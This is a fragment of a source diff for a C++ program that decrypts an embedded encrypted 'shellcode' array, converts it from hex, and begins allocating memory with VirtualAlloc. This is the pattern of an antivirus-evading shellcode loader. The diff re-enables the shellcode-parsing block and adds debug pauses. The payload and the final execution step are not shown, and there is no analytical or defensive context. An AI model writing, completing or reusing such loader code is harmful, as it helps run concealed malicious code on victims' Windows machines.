@@ -42,8 +42,17 @@ int main()
 
     vector<int> decrypted;
     unsigned char shellcode[lenEncrypted];
+#if DEBUG
+    printf("Start\n");
+    printf("Hit enter to continue\n");
+    getchar();
+#endif
     decrypted = decrypt(key, encrypted, lenEncrypted);
-
+#if DEBUG
+    printf("Decrypted\n");
+    printf("Hit enter to continue\n");
+    getchar();
+#endif
 
     std::stringstream ss;
     string result;
@@ -54,8 +63,13 @@ int main()
 
     }
     result = ss.str();
+#if DEBUG
+    printf("Stringstream\n");
+    printf("Hit enter to continue\n");
+    getchar();
+#endif
  //   cout << result << "\n";
-/*
+
     std::string hex_chars(result);
 
     std::istringstream hex_chars_stream(hex_chars);
@@ -79,7 +93,7 @@ int main()
         cout << shellcode[i];
     }
 
-*/
+
 
 	// Step 1 : Allocate the memory
 	void* memory = VirtualAlloc(nullptr,
